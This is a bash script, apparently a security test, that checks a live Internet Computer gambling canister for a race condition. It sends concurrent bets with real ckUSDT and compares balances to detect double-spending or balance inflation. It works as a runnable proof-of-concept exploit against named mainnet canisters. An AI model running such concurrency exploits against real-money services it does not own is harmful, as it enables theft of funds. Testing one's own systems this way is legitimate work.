#!/bin/bash
# Test for race condition vulnerability in crash_backend
# WARNING: This uses real ckUSDT on mainnet

set -e

CANISTER_ID="fws6k-tyaaa-aaaap-qqc7q-cai"
CKUSDT_CANISTER="cngnf-vqaaa-aaaar-qag4q-cai"
NETWORK="ic"

# Test parameters
BET_AMOUNT=1000000      # 1 USDT (6 decimals)
TARGET_MULTIPLIER=2.0   # 2x = 49.5% win rate
CONCURRENT_BETS=5       # Number of concurrent calls

echo "============================================"
echo "CRASH BACKEND RACE CONDITION TEST"
echo "============================================"
echo ""
echo "Parameters:"
echo "  Bet amount: $BET_AMOUNT (1 USDT)"
echo "  Target: ${TARGET_MULTIPLIER}x"
echo "  Concurrent bets: $CONCURRENT_BETS"
echo ""

# Check identity
PRINCIPAL=$(dfx identity get-principal)
echo "Testing as: $PRINCIPAL"
echo ""

# Check initial balance
echo "Step 1: Checking initial balance..."
INITIAL_BALANCE=$(dfx canister --network $NETWORK call $CANISTER_ID get_my_balance '()' | grep -oP '\d+(?= : nat64)')
echo "  Initial balance: $INITIAL_BALANCE"
echo ""

if [ "$INITIAL_BALANCE" -lt "$BET_AMOUNT" ]; then
    echo "ERROR: Insufficient balance. Need at least $BET_AMOUNT"
    echo ""
    echo "To deposit, first approve the canister:"
    echo "  dfx canister --network ic call $CKUSDT_CANISTER icrc2_approve '(record { spender = record { owner = principal \"$CANISTER_ID\" }; amount = 10_000_000 })'"
    echo ""
    echo "Then deposit:"
    echo "  dfx canister --network ic call $CANISTER_ID deposit '(1_000_000)'"
    exit 1
fi

echo "Step 2: Sending $CONCURRENT_BETS CONCURRENT play_crash calls..."
echo "  (Each betting $BET_AMOUNT at ${TARGET_MULTIPLIER}x)"
echo ""

# Create temp directory for results
RESULTS_DIR=$(mktemp -d)
echo "  Results dir: $RESULTS_DIR"

# Send concurrent calls using background processes
START_TIME=$(date +%s.%N)

for i in $(seq 1 $CONCURRENT_BETS); do
    (
        RESULT=$(dfx canister --network $NETWORK call $CANISTER_ID play_crash "($BET_AMOUNT : nat64, $TARGET_MULTIPLIER : float64)" 2>&1)
        echo "$RESULT" > "$RESULTS_DIR/result_$i.txt"
        echo "  Call $i completed"
    ) &
done

echo "  Waiting for all calls to complete..."
wait

END_TIME=$(date +%s.%N)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)
echo "  All calls completed in ${DURATION}s"
echo ""

# Analyze results
echo "Step 3: Analyzing results..."
echo ""

WINS=0
LOSSES=0
ERRORS=0

for i in $(seq 1 $CONCURRENT_BETS); do
    RESULT=$(cat "$RESULTS_DIR/result_$i.txt")

    if echo "$RESULT" | grep -q "won = true"; then
        echo "  Game $i: WON"
        ((WINS++)) || true
    elif echo "$RESULT" | grep -q "won = false"; then
        echo "  Game $i: LOST"
        ((LOSSES++)) || true
    elif echo "$RESULT" | grep -q "INSUFFICIENT_BALANCE"; then
        echo "  Game $i: REJECTED (insufficient balance)"
        ((ERRORS++)) || true
    else
        echo "  Game $i: ERROR - $RESULT"
        ((ERRORS++)) || true
    fi
done

echo ""
echo "Summary: $WINS wins, $LOSSES losses, $ERRORS rejected/errors"
echo ""

# Check final balance
echo "Step 4: Checking final balance..."
FINAL_BALANCE=$(dfx canister --network $NETWORK call $CANISTER_ID get_my_balance '()' | grep -oP '\d+(?= : nat64)')
echo "  Final balance: $FINAL_BALANCE"
echo ""

# Calculate expected vs actual
GAMES_PLAYED=$((WINS + LOSSES))
PAYOUT_PER_WIN=$((BET_AMOUNT * 2))  # 2x multiplier

echo "============================================"
echo "VERDICT"
echo "============================================"
echo ""
echo "  Initial balance:  $INITIAL_BALANCE"
echo "  Final balance:    $FINAL_BALANCE"
echo "  Games played:     $GAMES_PLAYED (of $CONCURRENT_BETS attempted)"
echo "  Games rejected:   $ERRORS"
echo "  Wins:             $WINS"
echo ""

if [ "$ERRORS" -eq $((CONCURRENT_BETS - 1)) ]; then
    echo "RESULT: NO VULNERABILITY DETECTED"
    echo "  Only 1 game executed, others were rejected."
    echo "  The race condition does not appear exploitable."
elif [ "$GAMES_PLAYED" -gt 1 ]; then
    echo "RESULT: VULNERABILITY CONFIRMED!"
    echo "  $GAMES_PLAYED games executed with only $INITIAL_BALANCE balance!"
    echo "  This should not be possible."
    echo ""

    # Check if balance inflated beyond single-game max
    MAX_SINGLE_GAME=$((INITIAL_BALANCE - BET_AMOUNT + PAYOUT_PER_WIN))
    if [ "$FINAL_BALANCE" -gt "$MAX_SINGLE_GAME" ]; then
        INFLATION=$((FINAL_BALANCE - INITIAL_BALANCE))
        echo "  BALANCE INFLATION DETECTED!"
        echo "  Balance increased by: $INFLATION"
        echo "  Max possible from 1 game: $((PAYOUT_PER_WIN - BET_AMOUNT))"
    fi
else
    echo "RESULT: INCONCLUSIVE"
    echo "  Need more data to determine if vulnerable."
fi

echo ""
echo "============================================"

# Cleanup
rm -rf "$RESULTS_DIR"
